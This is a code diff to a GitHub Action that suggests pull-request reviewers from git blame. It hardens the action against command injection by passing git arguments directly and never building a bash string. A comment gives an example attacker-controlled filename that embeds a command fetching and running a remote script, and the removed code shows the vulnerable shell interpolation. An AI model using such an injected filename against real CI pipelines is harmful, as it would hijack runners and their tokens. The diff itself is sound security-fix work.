@@ -71,7 +71,7 @@ async function analyzeFileBlame(file, options) {
 }
 async function checkFileExists(filename, ref) {
     try {
-        await execCommand(`git cat-file -e ${ref}:${filename}`);
+        await execGit(["cat-file", "-e", `${ref}:${filename}`]);
         return true;
     }
     catch {
@@ -79,7 +79,12 @@ async function checkFileExists(filename, ref) {
     }
 }
 async function getChangedLines(filename, baseRef, headRef) {
-    const diffOutput = await execCommand(`git diff ${baseRef}..${headRef} -- ${filename}`);
+    const diffOutput = await execGit([
+        "diff",
+        `${baseRef}..${headRef}`,
+        "--",
+        filename,
+    ]);
     const lines = diffOutput.split("\n");
     const changedLines = [];
     let currentLine = 0;
@@ -102,14 +107,16 @@ async function getChangedLines(filename, baseRef, headRef) {
     return changedLines;
 }
 async function getBlameData(filename, ref, lookbackDays) {
-    let blameCmd = `git blame --line-porcelain ${ref} -- ${filename}`;
+    const blameArgs = ["blame", "--line-porcelain"];
     // Add date filter if specified
     if (lookbackDays && lookbackDays > 0) {
         const since = new Date();
         since.setDate(since.getDate() - lookbackDays);
-        blameCmd += ` --since="${since.toISOString()}"`;
+        blameArgs.push(`--since=${since.toISOString()}`);
     }
-    const blameOutput = await execCommand(blameCmd);
+    // Options have to come before the pathspec, everything after `--` is a path.
+    blameArgs.push(ref, "--", filename);
+    const blameOutput = await execGit(blameArgs);
     return parseBlameOutput(blameOutput);
 }
 function parseBlameOutput(blameOutput) {
@@ -148,7 +155,16 @@ function parseBlameOutput(blameOutput) {
     }
     return blameData;
 }
-async function execCommand(command) {
+/**
+ * Run git with an explicit argument list.
+ *
+ * Arguments are handed to the process directly and never go through a shell.
+ * Some of them, filenames in particular, come from the pull request and are
+ * therefore attacker controlled: a file named `a$(curl evil.sh|sh)b` would run
+ * as a command if these were interpolated into a shell string. That matters
+ * most under `pull_request_target`, where the job holds a writable token.
+ */
+async function execGit(args) {
     let output = "";
     let error = "";
     const options = {
@@ -163,10 +179,10 @@ async function execCommand(command) {
         silent: true,
         ignoreReturnCode: true,
     };
-    const exitCode = await exec.exec("bash", ["-c", command], options);
+    const exitCode = await exec.exec("git", args, options);
     if (exitCode !== 0) {
         const errorMessage = error || `Command failed with exit code ${exitCode}`;
-        throw new Error(`Failed to execute command: ${command}\nError: ${errorMessage}`);
+        throw new Error(`Failed to execute command: git ${args.join(" ")}\nError: ${errorMessage}`);
     }
     if (error) {
         core.debug(`Command stderr: ${error}`);
@@ -510,11 +526,20 @@ async function run() {
         }
         // Create comment with review suggestions
         core.info(`📬 Creating comment to suggest reviewers: ${reviewersToSuggest.map((r) => r.username).join(", ")}`);
-        await (0, github_api_1.createReviewComment)(octokit, context, reviewersToSuggest.map((r) => ({
-            username: r.username,
-            percentage: r.stats.percentageOfChanges,
-            linesChanged: r.stats.linesChanged,
-        })));
+        try {
+            await (0, github_api_1.createReviewComment)(octokit, context, reviewersToSuggest.map((r) => ({
+                username: r.username,
+                percentage: r.stats.percentageOfChanges,
+                linesChanged: r.stats.linesChanged,
+            })));
+        }
+        catch (error) {
+            // Suggesting reviewers is a convenience, not a reason to fail the check.
+            core.warning(`${error instanceof Error ? error.message : String(error)}. ` +
+                "Does the job grant `permissions: pull-requests: write`? " +
+                "GITHUB_TOKEN is always read-only on `pull_request` runs from a fork, " +
+                "use `pull_request_target` to comment on those.");
+        }
         // Output summary
         core.info("\n📊 Review Suggestion Summary:");
         reviewersToSuggest.forEach((reviewer) => {
